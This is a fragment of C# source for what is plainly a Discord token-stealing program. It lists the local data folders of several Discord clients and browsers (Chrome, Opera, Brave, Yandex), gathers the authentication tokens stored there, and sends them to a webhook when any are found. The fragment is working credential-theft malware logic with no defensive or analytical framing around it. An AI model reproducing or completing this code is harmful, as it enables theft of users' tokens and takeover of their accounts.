public static List<string> TokenReport = new List<string>();


        private readonly static List<Service> _services = new List<Service>()
        {
            new Service("Discord", @"Roaming\Discord"),
            new Service("Discord Canary", @"Roaming\discordcanary", true),
            new Service("Discord PTB", @"Roaming\discordptb"),
            new Service("Google Chrome", @"Local\Google\Chrome\User Data\Default"),
            new Service("Opera", @"Roaming\Opera Software\Opera Stable", true),
            new Service("Brave", @"Local\BraveSoftware\Brave-Browser\User Data\Default", true),
            new Service("Yandex", @"Local\Yandex\YandexBrowser\User Data\Default", true)
        };


        static void Main(string[] args)
        {
            foreach (var service in _services)
                service.GetTokens();

            if (Grabber.TokensFound)
                Webhook.ReportTokens(TokenReport);
        }